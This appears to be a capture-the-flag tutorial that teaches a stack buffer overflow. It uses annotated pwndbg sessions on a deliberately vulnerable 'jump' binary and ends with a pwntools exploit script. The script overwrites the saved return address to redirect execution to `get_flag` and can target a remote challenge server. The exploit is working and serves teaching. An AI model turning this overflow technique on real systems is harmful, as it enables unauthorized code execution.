This problem assumes you have some level of knowledge of how gdb/pwndbg works.
If you use GEF, don't worry. They both work pretty much the same. If you don't
know how to use them, review their respective tutorials first.

After reversing the program, you should see that it prints out a few taunting
messages, then calls `gets` on a buffer. From the last program, we know that
`gets` is unsafe, and we can use it to overwrite data on the stack. However,
first we have to figure out what to overwrite. To do this, we will first review
how function calls work in assembly. Lets start stepping through how a normal
function call works (any lines that start with pwndbg> are commands I entered,
otherwise they are output. Output may be trimmed for brevity)

```
pwndbg> b main
pwndbg> r
pwndbg> n 3
► 0x4011bb <main+25>       call   vuln <vuln>
```

The call instruction in x86/64 assembly pushes the address of the next
instruction onto the stack, and then jumps to the function.

```
pwndbg> si
pwndbg> stack
00:0000│ rsp  0x7fffffffddc8 —▸ 0x4011c0 (main+30) ◂— mov    eax, 0
01:0008│ rbp  0x7fffffffddd0 —▸ 0x401210 (__libc_csu_init) ◂— endbr64 
02:0010│      0x7fffffffddd8 —▸ 0x7ffff7df4152 (__libc_start_main+242) ◂— mov
```

Once we enter the `vuln` function, we can see that our return address (`0x4011c0`) is at the
top of the stack. pwndbg helpfully annotates this value as `main+30`, which is
the instruction after the call. Remeber that the stack is stored upside down in memory, so the
top of the stack has a lower memory address than the bottom. Also, your stack
addresses may be different than mine. Due to a security feature called ASLR,
which is enabled on almost all systems, the stack is loaded in at a randomized
address. This means your exploits should never rely on stack addresses being at
the exact same spot every time. Instead, we will track things relative to `rsp`
and `rbp`, as the offsets from those registers are not randomized.

Next, we go through the functions prologue. This saves the old stack base
pointer, then sets up the bottom and top of the stack for the new stack frame.
Remember that `rbp` is the bottom of the current stack frame, and `rsp` is the
top.

```
pwndbg> n
 ► 0x40117a <vuln+4>     push   rbp
   0x40117b <vuln+5>     mov    rbp, rsp
   0x40117e <vuln+8>     sub    rsp, 0x70
pwndbg> n 3
pwndbg> stack 16
00:0000│ rsp  0x7fffffffdd50 —▸ 0x7ffff7f8f608 (stdout) —▸ 0x7ffff7f8f520 (_IO_2_1_stdout_) ◂— 0xfbad2a84
01:0008│      0x7fffffffdd58 —▸ 0x7ffff7f90320 (__GI__IO_file_jumps) ◂— 0x0
02:0010│      0x7fffffffdd60 ◂— 0x0
03:0018│      0x7fffffffdd68 —▸ 0x7ffff7e4e3a9 (__GI__IO_do_write+25) ◂— cmp    rbx, rax
04:0020│      0x7fffffffdd70 ◂— 0xa /* '\n' */
05:0028│      0x7fffffffdd78 —▸ 0x7ffff7e4e813 (__GI__IO_file_overflow+259) ◂— cmp    eax, -1
06:0030│      0x7fffffffdd80 ◂— 0x3c /* '<' */
07:0038│      0x7fffffffdd88 —▸ 0x7ffff7f8f520 (_IO_2_1_stdout_) ◂— 0xfbad2a84
08:0040│      0x7fffffffdd90 —▸ 0x402020 ◂— 'Haha! I removed the if statement! You can never hack me now!'
09:0048│      0x7fffffffdd98 —▸ 0x7ffff7e434fa (puts+378) ◂— cmp    eax, -1
0a:0050│      0x7fffffffdda0 ◂— 0x0
0b:0058│      0x7fffffffdda8 —▸ 0x7fffffffddd0 —▸ 0x401210 (__libc_csu_init) ◂— endbr64 
0c:0060│      0x7fffffffddb0 —▸ 0x401090 (_start) ◂— endbr64 
0d:0068│      0x7fffffffddb8 ◂— 0x0
0e:0070│ rbp  0x7fffffffddc0 —▸ 0x7fffffffddd0 —▸ 0x401210 (__libc_csu_init) ◂— endbr64 
0f:0078│      0x7fffffffddc8 —▸ 0x4011c0 (main+30) ◂— mov    eax, 0
```

Now that the current stack frame is set up, we can seperate the stack into 3
parts. At `[rbp+0x8]` we have the return value for the current stack frame. At
`[rbp]` we have the saved `rbp` value for when the function returns, and at
`[rbp-0x8]` through `[rsp]` we have the local stack data for the function. While
it looks like this section of the stack frame is full of data, its actually all
just junk left over from previous stack frames. All of it will get overwritten
by the current stack frame as it executes.

```
pwndbg> n 5
 ► 0x40119a <vuln+36>    call   gets@plt <gets@plt>
        rdi: 0x7fffffffdd50 —▸ 0x7ffff7f8f608 (stdout) —▸ 0x7ffff7f8f520 (_IO_2_1_stdout_) ◂— 0xfbad2a84
        rsi: 0x4052a0 ◂— 'Gimme some input\nhe if statement! You can never hack me now!\n'
        rdx: 0x0
        rcx: 0x7ffff7ebcf67 (write+23) ◂— cmp    rax, -0x1000 /* 'H=' */
pwndbg> stack 16
00:0000│ rdi rsp  0x7fffffffdd50 —▸ 0x7ffff7f8f608 (stdout) —▸ 0x7ffff7f8f520 (_IO_2_1_stdout_) ◂— 0xfbad2a84
01:0008│          0x7fffffffdd58 —▸ 0x7ffff7f90320 (__GI__IO_file_jumps) ◂— 0x0
02:0010│          0x7fffffffdd60 ◂— 0x0
03:0018│          0x7fffffffdd68 —▸ 0x7ffff7e4e3a9 (__GI__IO_do_write+25) ◂— cmp    rbx, rax
04:0020│          0x7fffffffdd70 ◂— 0xa /* '\n' */
05:0028│          0x7fffffffdd78 —▸ 0x7ffff7e4e813 (__GI__IO_file_overflow+259) ◂— cmp    eax, -1
06:0030│          0x7fffffffdd80 ◂— 0x3c /* '<' */
07:0038│          0x7fffffffdd88 —▸ 0x7ffff7f8f520 (_IO_2_1_stdout_) ◂— 0xfbad2a84
08:0040│          0x7fffffffdd90 —▸ 0x402020 ◂— 'Haha! I removed the if statement! You can never hack me now!'
09:0048│          0x7fffffffdd98 —▸ 0x7ffff7e434fa (puts+378) ◂— cmp    eax, -1
0a:0050│          0x7fffffffdda0 ◂— 0x0
0b:0058│          0x7fffffffdda8 —▸ 0x7fffffffddd0 —▸ 0x401210 (__libc_csu_init) ◂— endbr64 
0c:0060│          0x7fffffffddb0 —▸ 0x401090 (_start) ◂— endbr64 
0d:0068│          0x7fffffffddb8 ◂— 0x0
0e:0070│ rbp      0x7fffffffddc0 —▸ 0x7fffffffddd0 —▸ 0x401210 (__libc_csu_init) ◂— endbr64 
0f:0078│          0x7fffffffddc8 —▸ 0x4011c0 (main+30) ◂— mov    eax, 0
```

It's important to remember that pwndbg doesn't know everything about the binary
we are stepping through. It often just has to make its best guess. For example,
it annotates the call to `gets` with 4 parameters. However, we know from looking
at the function signiture (type `man gets` in your terminal to see the
documentation for the function) that `gets` only takes 1 parameter. Therefore,
`gets` will only actually use the first parameter it is given (`rdi`). We can
see from the stack diagram that `gets` is going to start writing at the top of
the stack, and work its way down. Lets enter some data and see what happens.

```
pwndbg> n
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
pwndbg> stack 16
00:0000│ rax r8 rsp  0x7fffffffdd50 ◂— 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
01:0008│             0x7fffffffdd58 ◂— 'caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
02:0010│             0x7fffffffdd60 ◂— 'eaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
03:0018│             0x7fffffffdd68 ◂— 'gaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
04:0020│             0x7fffffffdd70 ◂— 'iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
05:0028│             0x7fffffffdd78 ◂— 'kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
06:0030│             0x7fffffffdd80 ◂— 'maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
07:0038│             0x7fffffffdd88 ◂— 'oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
08:0040│             0x7fffffffdd90 ◂— 'qaaaraaasaaataaauaaavaaawaaaxaaayaaa'
09:0048│             0x7fffffffdd98 ◂— 'saaataaauaaavaaawaaaxaaayaaa'
0a:0050│             0x7fffffffdda0 ◂— 'uaaavaaawaaaxaaayaaa'
0b:0058│             0x7fffffffdda8 ◂— 'waaaxaaayaaa'
0c:0060│             0x7fffffffddb0 ◂— 0x61616179 /* 'yaaa' */
0d:0068│             0x7fffffffddb8 ◂— 0x0
0e:0070│ rbp         0x7fffffffddc0 —▸ 0x7fffffffddd0 —▸ 0x401210 (__libc_csu_init) ◂— endbr64 
0f:0078│             0x7fffffffddc8 —▸ 0x4011c0 (main+30) ◂— mov    eax, 0
```
We can see that `gets` filled up the stack with our input. We entered 100 bytes
(1 letter = 1 byte), and as such filled up `[rsp]` through `[rsp-100]`. Lets
continue to the end of the function.

```
pwndbg> n
 ► 0x4011a0       <vuln+42>                  leave  
   0x4011a1       <vuln+43>                  ret    
```

The leave instruction returns to the previous stack frame by setting `rsp` equal
to `rbp`, and returning the saved value to `rbp`. Then, the ret instruction will
pop a value from the stack (which is the same as accessing the value of `rsp`
and adding `8` to `rsp`) into the instruction pointer. This means the program
will jump to the value at `rsp` when `ret` is called.

```
pwndbg> stack
00:0000│ rsp  0x7fffffffddc8 —▸ 0x4011c0 (main+30) ◂— mov    eax, 0
01:0008│ rbp  0x7fffffffddd0 —▸ 0x401210 (__libc_csu_init) ◂— endbr64 
02:0010│      0x7fffffffddd8 —▸ 0x7ffff7df4152 (__libc_start_main+242) ◂— mov    edi, eax
pwndbg> n
 ► 0x4011c0       <main+30>                  mov    eax, 0
```

Now that we fully understand how the `vuln` function works, we can try to
exploit it. We will restart gdb, and step back into `vuln`

```
pwndbg> b main
pwndbg> r
pwndbg> n 3
pwndbg> si
pwndbg> n 9
 ► 0x40119a <vuln+36>    call   gets@plt <gets@plt>
        rdi: 0x7fffffffdd50 —▸ 0x7ffff7f8f608 (stdout) —▸ 0x7ffff7f8f520 (_IO_2_1_stdout_) ◂— 0xfbad2a84
```

Now that we are back at our gets call, we can try to exploit it. If we enter
more data than `gets` expects, we can overwrite important values on the stack.
The obvious target is the saved return value. If we overwrite that, we can
control where the program jumps to. Lets try entering more bytes than it
expects. Here we will send 128 bytes of data,

```
pwndbg> n
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab
pwndbg> stack 16
00:0000│ rax r8 rsp  0x7fffffffdd50 ◂— 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab'
01:0008│             0x7fffffffdd58 ◂— 'caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab'
02:0010│             0x7fffffffdd60 ◂— 'eaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab'
03:0018│             0x7fffffffdd68 ◂— 'gaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab'
04:0020│             0x7fffffffdd70 ◂— 'iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab'
05:0028│             0x7fffffffdd78 ◂— 'kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab'
06:0030│             0x7fffffffdd80 ◂— 'maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab'
07:0038│             0x7fffffffdd88 ◂— 'oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab'
08:0040│             0x7fffffffdd90 ◂— 'qaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab'
09:0048│             0x7fffffffdd98 ◂— 'saaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab'
0a:0050│             0x7fffffffdda0 ◂— 'uaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab'
0b:0058│             0x7fffffffdda8 ◂— 'waaaxaaayaaazaabbaabcaabdaabeaabfaabgaab'
0c:0060│             0x7fffffffddb0 ◂— 'yaaazaabbaabcaabdaabeaabfaabgaab'
0d:0068│             0x7fffffffddb8 ◂— 'baabcaabdaabeaabfaabgaab'
0e:0070│ rbp         0x7fffffffddc0 ◂— 'daabeaabfaabgaab'
0f:0078│             0x7fffffffddc8 ◂— 'faabgaab'
```

We can see that the saved return address has been overwritten with 'faabgaab'.
Now, if we continue, the program will jump to this address

```
pwndbg> c
 ► 0x4011a1 <vuln+43>    ret    <0x6261616762616166>
```

The program sigsevs on this instruction because it is trying to return to
0x6261616762616166 (which is just "faabgaab" treated as a number instead of a
string), but it knows that this is not a valid memory address. Therefore, it
errors out. However, what if we carefully designed our payload to make sure that
we overwrite it with a valid memory address?  Since making this payload by hand
would be difficult, we use a python library called pwntools to do it for us.
pwntools is incredibly useful and will be used in almost all pwn problems from
now on.

We know that faabgaab are the last 8 bytes of the 128 byte long sequence we
used. These 8 bytes should be replaced by the address of the place we want to
jump to. From reading the dissasembly we can see that `get_flag`, the function
we want to jump to, is located at `0x4011c7`. Therefore, we know that we want
120 bytes of filler, and then our memory address as the last 8 bytes. We will
use pwntools to create this payload. pwntools includes a function called `p64`
that formats a number as a 64 bit (8 byte) integer. We will use this on our
memory address to properly format it as 8 bytes.

`payload = b"A"*120 + p64(0x4011c7)`

If we send this to the program (full script is at the end of the writeup), the
stack will look like this after calling gets

```
pwndbg> b gets
pwndbg> c
pwndbg> finish
pwndbg> stack 16
00:0000│ rax r8 rsp  0x7fff3c268730 ◂— 0x4141414141414141 ('AAAAAAAA')
... ↓
0f:0078│             0x7fff3c2687a8 —▸ 0x4011c7 (get_flag) ◂— endbr64 
```

We can see that where the return address used to be is now the address of
`get_flag`. If we continue, a shell will open on our original window. Then, we
can just run `cat flag.txt` to get the flag, and solve the problem!

This technique is very common in pwn problems, and is called a buffer overflow.
It can be caused by any function that writes to memory that the programmer
didn't expect it would write to. In later tutorials we will see some ways buffer
overflows can be prevented, and some way to use them.

Side Note: While this process looks like it takes a long time, we can actually
do it very quickly with the help of pwntools. Create a long pattern using the
command `pwn cyclic 200` at the commandline. Run the program in gdb, and enter
the pattern we generated. This will cause the program to sigsev on the ret
instruction, and from that we can find a value like 0x6261616762616166. Put the
last 4 bytes into the command `pwn cyclic -o 0x62616166`, and it will return the
offset we should put our payload at to overwrite the return address.

Exploit script (read pwntools for pwn in the tools tab for more explanation): 

```python
from pwn import *

# context.terminal = ['konsole','-e'] if gdb.debug doesnt work, try changing this to your terminal of choice
context.binary = 'jump'

# three ways to start the binary. Local, remote, debugging. Uncomment 1 at a time to try them out
# p = process('jump') # start binary
# p = remote('forever.isss.io', 1303) # for connecting to the remote server
# p = gdb.debug('jump')
# We need the b there to make it a byte string. Python will mess with strings by default to make sure they are valid UTF-8, and we don't want that
payload = b"A"*120 + p64(0x4011c7) # Address of get_flag

p.sendline(payload)
p.interactive() # hooks the program back up to our terminal (like we just ran it normally)
```
